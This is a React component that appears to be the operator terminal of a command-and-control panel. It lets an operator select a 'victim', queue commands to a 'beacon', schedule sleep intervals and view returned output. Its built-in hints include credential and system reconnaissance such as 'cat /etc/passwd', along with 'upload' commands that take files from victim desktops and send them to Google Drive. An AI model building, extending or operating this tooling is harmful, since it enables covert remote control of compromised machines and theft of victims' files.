import { useState, useRef, useEffect } from 'react';
import { useApp } from '../context/AppContext';

// Pulsing badge shown in toolbar while waiting for beacon output
function PollingBadge() {
  return (
    <div className="flex items-center gap-2 px-2.5 py-1 rounded-lg bg-[#ffa502]/10 border border-[#ffa502]/20">
      <span className="w-2 h-2 rounded-full bg-[#ffa502] pulse-online flex-shrink-0" />
      <span className="text-[10px] text-[#ffa502] font-medium">Waiting for beacon…</span>
    </div>
  );
}

const HINTS = [
  'whoami','hostname','ipconfig','ifconfig','pwd','ls -la','dir',
  'ps aux','tasklist','netstat -an','cat /etc/passwd',
  'sleep 10s','sleep 5m','sleep 1h','sleep 08:00:00',

  'upload;C:\\Users\\victim\\Desktop\\file.txt',
  'upload;/home/user/secret.pdf',
  'download;<fileId>;C:\\dest\\file.txt',
  'exit',
];

function badge(type) {
  const m = {
    upload:   { l:'UPLOAD',   c:'#00d4ff' },
    download: { l:'DOWNLOAD', c:'#ffa502' },
    danger:   { l:'EXIT',     c:'#ff4757' },
    command:  { l:'CMD',      c:'#00ff88' },
  };
  const i = m[type] || m.command;
  return (
    <span className="badge flex-shrink-0 text-[10px] px-1.5 py-0.5 rounded font-bold tracking-wider"
      style={{ color: i.c, background: i.c+'18', border:`1px solid ${i.c}30` }}>
      {i.l}
    </span>
  );
}

function classify(cmd) {
  if (!cmd) return null;
  if (cmd === 'Delay configuration (sec)') return null;
  if (cmd.startsWith('upload;'))   return 'upload';
  if (cmd.startsWith('download;')) return 'download';
  if (cmd === 'exit')              return 'danger';
  return 'command';
}

function Row({ row, idx }) {
  const type = classify(row.command);
  const [exp, setExp] = useState(false);
  if (!type) return null;

  const long = row.output && row.output.length > 300;
  const out  = long && !exp ? row.output.slice(0, 300) + '…' : row.output;
  const pending = row.command && !row.output;

  return (
    <div className="cmd-row border-b border-[#21262d]/40 fade-in">
      <div className="flex items-start gap-3 px-5 py-3">
        <span className="text-[#484f58] text-[10px] w-5 flex-shrink-0 pt-0.5 text-right select-none">{idx}</span>
        {badge(type)}
        <div className="flex-1 min-w-0">
          <div className="flex items-center gap-2">
            <span className="text-[#00ff88] text-xs">❯</span>
            <span className="text-[#e6edf3] text-sm break-all">{row.command}</span>
          </div>
        </div>
        {row.timestamp && (
          <span className="text-[#484f58] text-[10px] flex-shrink-0 pt-0.5 whitespace-nowrap">
            {row.timestamp.split(' ')[0]}
          </span>
        )}
      </div>

      {pending ? (
        <div className="flex items-center gap-2 px-5 pb-3 pl-16">
          <span className="w-1.5 h-1.5 rounded-full bg-[#8b949e] animate-bounce" style={{animationDelay:'0ms'}}/>
          <span className="w-1.5 h-1.5 rounded-full bg-[#8b949e] animate-bounce" style={{animationDelay:'150ms'}}/>
          <span className="w-1.5 h-1.5 rounded-full bg-[#8b949e] animate-bounce" style={{animationDelay:'300ms'}}/>
          <span className="text-[#8b949e] text-xs ml-1">Waiting for beacon…</span>
        </div>
      ) : out ? (
        <div className="px-5 pb-3 pl-16">
          <pre className="text-[11px] leading-relaxed text-[#c9d1d9] bg-[#161b22] rounded-lg p-3 border border-[#21262d] overflow-x-auto whitespace-pre-wrap break-all">
            {out}
          </pre>
          {long && (
            <button onClick={() => setExp(!exp)}
              className="mt-1 text-[#00ff88] text-xs hover:underline">
              {exp ? '▲ collapse' : `▼ show more (${row.output.length} chars)`}
            </button>
          )}
          {type === 'upload' && (
            <p className="mt-1 text-xs text-[#00d4ff]">✓ File uploaded to Google Drive</p>
          )}
        </div>
      ) : null}
    </div>
  );
}

export default function Terminal() {
  const {
    activeVictim, rows, loading, fetchRows,
    sendCommand, error, setError,
    lastRefresh, polling, sleepStatus,
    parseHHMMSS,
  } = useApp();

  const [input, setInput]     = useState('');
  const [sending, setSending] = useState(false);
  const [hist, setHist]       = useState([]);
  const [hIdx, setHIdx]       = useState(-1);
  const [sugg, setSugg]       = useState([]);
  const [showS, setShowS]     = useState(false);
  const inputRef  = useRef(null);
  const bottomRef = useRef(null);

  const cmdRows = rows.filter(r => classify(r.command));
  const activeSleep = sleepStatus?.[activeVictim?.id];
  const activeSleepState = activeSleep?.state;
  const isSleeping = activeSleepState === 'sleeping' && new Date(activeSleep?.wakeAt) > new Date();
  const isReady = activeSleepState === 'ready';
  const isWaiting = activeSleepState === 'waiting';

  useEffect(() => { bottomRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [rows]);

  const onInput = (e) => {
    const v = e.target.value;
    setInput(v); setHIdx(-1);
    if (v) { const f = HINTS.filter(h=>h.toLowerCase().includes(v.toLowerCase())).slice(0,6); setSugg(f); setShowS(f.length>0); }
    else setShowS(false);
  };

  const onKey = (e) => {
    if (e.key==='Enter')  { submit(); return; }
    if (e.key==='Tab')    { e.preventDefault(); if(sugg[0]){setInput(sugg[0]);setShowS(false);} }
    if (e.key==='Escape') { setShowS(false); }
    if (e.key==='ArrowUp'){ e.preventDefault(); const i=Math.min(hIdx+1,hist.length-1); setHIdx(i); if(hist[i])setInput(hist[i]); }
    if (e.key==='ArrowDown'){ e.preventDefault(); const i=Math.max(hIdx-1,-1); setHIdx(i); setInput(i>=0?hist[i]:''); }
  };

  const submit = async () => {
    const cmd = input.trim(); if(!cmd||sending) return;
    setSending(true); setShowS(false); setInput('');
    setHist(h=>[cmd,...h.slice(0,49)]);
    setError(null);
    await sendCommand(cmd);
    setSending(false); inputRef.current?.focus();
  };

  if (!activeVictim) return (
    <div className="flex-1 flex items-center justify-center bg-[#0a0c10] grid-bg">
      <div className="text-center">
        <div className="text-6xl mb-4 opacity-10">⌨</div>
        <p className="text-[#484f58] text-sm">Select a victim from the sidebar</p>
      </div>
    </div>
  );

  return (
    <div className="flex-1 flex flex-col bg-[#0a0c10] min-w-0 overflow-hidden">
      {/* Toolbar */}
      <div className="flex items-center justify-between px-5 py-2.5 border-b border-[#21262d] bg-[#0f1117] flex-shrink-0">
        <div className="flex items-center gap-3">
          <div className="w-2 h-2 rounded-full bg-[#00ff88] pulse-online"/>
          <span className="text-xs text-[#e6edf3] font-medium truncate max-w-xs">{activeVictim.title}</span>
        </div>
        <div className="flex items-center gap-2">
          {/* Manual refresh */}
          <button
            onClick={() => fetchRows()}
            disabled={loading}
            title="Refresh"
            className="flex items-center gap-1.5 text-xs text-[#8b949e] hover:text-[#e6edf3] px-2.5 py-1.5 rounded-lg hover:bg-[#161b22] border border-transparent transition-all disabled:opacity-40"
          >
            <svg className={`w-3.5 h-3.5 ${loading ? 'spin' : ''}`} fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/>
            </svg>
            Refresh
          </button>
          {/* Sleep status indicator */}
          {isSleeping ? (
            <div className="flex items-center gap-2 px-2.5 py-1 rounded-lg bg-[#ffa502]/10 border border-[#ffa502]/20">
              <span className="w-2 h-2 rounded-full bg-[#ffa502] pulse-online shrink-0" />
              <span className="text-[10px] text-[#ffa502] font-medium">
                Sleeping until {new Date(activeSleep.wakeAt).toLocaleTimeString()}
              </span>
            </div>
          ) : isReady ? (
            <div className="flex items-center gap-2 px-2.5 py-1 rounded-lg bg-[#00ff88]/10 border border-[#00ff88]/20">
              <span className="w-2 h-2 rounded-full bg-[#00ff88] pulse-online shrink-0" />
              <span className="text-[10px] text-[#00ff88] font-medium">Ready after sleep</span>
            </div>
          ) : isWaiting ? (
            <div className="flex items-center gap-2 px-2.5 py-1 rounded-lg bg-[#ff4757]/10 border border-[#ff4757]/20">
              <span className="w-2 h-2 rounded-full bg-[#ff4757] pulse-online shrink-0" />
              <span className="text-[10px] text-[#ff4757] font-medium">Sleep ended, waiting for reconnection</span>
            </div>
          ) : polling ? (
            <PollingBadge />
          ) : (
            <div className="flex items-center gap-2 px-2.5 py-1 rounded-lg bg-[#00ff88]/10 border border-[#00ff88]/20">
              <span className="w-2 h-2 rounded-full bg-[#00ff88] pulse-online shrink-0" />
              <span className="text-[10px] text-[#00ff88] font-medium">Beacon active</span>
            </div>
          )}
        </div>
      </div>

      {/* Stats */}
      <div className="flex items-center gap-4 px-5 py-1.5 border-b border-[#21262d]/30 bg-[#0f1117]/70 flex-shrink-0 text-[10px] text-[#8b949e]">
        <span><span className="text-[#00ff88]">●</span> {cmdRows.length} commands</span>
        <span><span className="text-[#00d4ff]">●</span> {cmdRows.filter(r=>r.command.startsWith('upload;')).length} uploads</span>
        {polling && (
          <span className="text-[#ffa502]">
            ↻ Auto-polling every 4s for beacon response…
          </span>
        )}
        {lastRefresh && <span className="ml-auto text-[#484f58]">Last sync: {lastRefresh.toLocaleTimeString()}</span>}
      </div>

      {/* Error */}
      {error && (
        <div className="flex items-center gap-2 px-5 py-2 bg-[#ff4757]/10 border-b border-[#ff4757]/20 flex-shrink-0">
          <span className="text-[#ff4757] text-xs flex-1">{error}</span>
          <button onClick={()=>setError(null)} className="text-[#ff4757] text-xs">✗</button>
        </div>
      )}

      {/* Output */}
      <div className="flex-1 overflow-y-auto scanlines relative">
        <div className="sticky top-0 flex gap-3 px-5 py-1.5 bg-[#0f1117]/95 border-b border-[#21262d]/30 backdrop-blur-sm z-10 text-[10px] text-[#484f58] uppercase tracking-wider">
          <span className="w-5">#</span>
          <span className="w-16">Type</span>
          <span className="flex-1">Command / Output</span>
          <span>Time</span>
        </div>
        {cmdRows.length === 0 ? (
          <div className="flex flex-col items-center justify-center py-20 text-center">
            <div className="text-4xl mb-3 opacity-10">$_</div>
            <p className="text-[#484f58] text-xs">No commands yet — type below</p>
          </div>
        ) : (
          cmdRows.map((r, i) => <Row key={r.rowIndex} row={r} idx={i+1}/>)
        )}
        <div ref={bottomRef}/>
      </div>

      {/* Input */}
      <div className="border-t border-[#21262d] bg-[#0f1117] px-5 py-3 flex-shrink-0">
        <div className="relative">
          {showS && (
            <div className="absolute bottom-full mb-1 left-0 right-0 bg-[#161b22] border border-[#21262d] rounded-lg overflow-hidden shadow-2xl z-20">
              {sugg.map((s,i)=>(
                <button key={i} onClick={()=>{setInput(s);setShowS(false);inputRef.current?.focus();}}
                  className="w-full text-left px-3 py-2 text-xs text-[#e6edf3] hover:bg-[#21262d] flex items-center gap-2">
                  <span className="text-[#00ff88]">❯</span>{s}
                </button>
              ))}
            </div>
          )}
          <div className="flex items-center gap-3 bg-[#161b22] border border-[#30363d] rounded-xl px-4 py-3 focus-within:border-[#00ff88]/50 transition-all">
            <span className="text-[#00ff88] text-sm accent-glow flex-shrink-0">❯</span>
            <input ref={inputRef} type="text" value={input} onChange={onInput} onKeyDown={onKey}
              placeholder="Type a command… (Tab=autocomplete, ↑↓=history)"
              autoFocus
              className="flex-1 bg-transparent text-sm text-[#e6edf3] placeholder-[#484f58] outline-none"
              style={{fontFamily:'monospace'}}/>
            <button onClick={submit} disabled={!input.trim()||sending}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg text-xs font-semibold transition-all disabled:opacity-40 flex-shrink-0"
              style={{background:'linear-gradient(135deg,#00ff88,#00d4ff)',color:'#0a0c10'}}>
              {sending
                ? <svg className="w-3.5 h-3.5 spin" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15"/></svg>
                : <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M13 7l5 5m0 0l-5 5m5-5H6"/></svg>
              }
              Send
            </button>
          </div>
          <p className="mt-1.5 text-[10px] text-[#484f58]">
            <kbd className="bg-[#21262d] px-1 rounded">Enter</kbd> send &nbsp;
            <kbd className="bg-[#21262d] px-1 rounded">Tab</kbd> autocomplete &nbsp;
            <kbd className="bg-[#21262d] px-1 rounded">↑↓</kbd> history &nbsp;|&nbsp;
            sleep <em>10s/5m/1h/08:00:00</em> · upload;<em>path</em> · download;<em>fileId</em>;<em>dest</em> · exit
          </p>
        </div>
      </div>
    </div>
  );
}
